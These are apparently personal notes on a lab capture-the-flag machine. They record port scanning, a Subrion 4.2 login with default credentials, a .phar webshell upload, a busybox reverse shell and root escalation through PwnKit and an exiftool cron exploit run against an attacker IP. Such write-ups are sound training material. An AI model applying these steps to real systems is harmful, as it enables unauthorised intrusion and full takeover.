### Enumeration
```
IP=192.168.187.163
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80 -A $IP
```
#### Ports
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
- 80
	- Apache httpd 2.4.41 ((Ubuntu))
	- `http://exfiltrated.offsec/
	- Added to /etc/hosts: `192.168.187.163 exfiltrated.offsec`
### Foothold
- 80
	- Default page
		- ![[Pasted image 20240625090253.png]]
		- tab bar says: powered by subrion 4.2
		- Searchsploit subrion 4.2
			- XSS, File upload
			- Exploit-db 49876
				- Uploads a .phar file
				- .htaccess allows phar files to be executed
				- Changed webshell.php to webshell.phar
				- Go to panel/uploads  and drop it in there
				- ![[Pasted image 20240625091937.png]]
				- ![[Pasted image 20240625091945.png]]
				- Used busybox rev shell
	- Login page
		- admin:admin
			- successful
### PE
#### Linux
- id
	- uid=33(www-data) gid=33(www-data) groups=33(www-data)
- sudo -l
	- needs password
- uname -a
	- `Linux exfiltrated 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`
- capabilities
	- /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
	- /usr/bin/traceroute6.iputils = cap_net_raw+ep
	- /usr/bin/ping = cap_net_raw+ep
	- /usr/bin/mtr-packet = cap_net_raw+ep
- suid
	- Nothing
	- ![[Pasted image 20240625092252.png]]
- linpeas
	- possible exploits
		- pwnkit
			- ./PwnKit
				- rooted
				- ![[Pasted image 20240625094125.png]]
	- console users
		- coaran:x:1000:1000::/home/coaran:/bin/bash
		- root:x:0:0:root:/root:/bin/bash
	- Cron
		- /image-exif.sh was always running
			- cat /opt/image-exif.sh
				- ![[Pasted image 20240625094702.png]]
			- We have read and execute permissions
			- googled exiftool privilege escalation
				- exploit-db 50911
					- python3 50911.py -s 192.168.45.195 8000
					- Now we have image.jpg
					- Now we put it into the uploads folder. Used browser to put file into uploads
					- ![[Pasted image 20240625100411.png]]
					- ![[Pasted image 20240625100429.png]]
### Lessons Learned
- Read the linpeas output thoroughly. Check any programs that are always running and see what we can do with them
- Sometime exploits don't work and you have to do them manually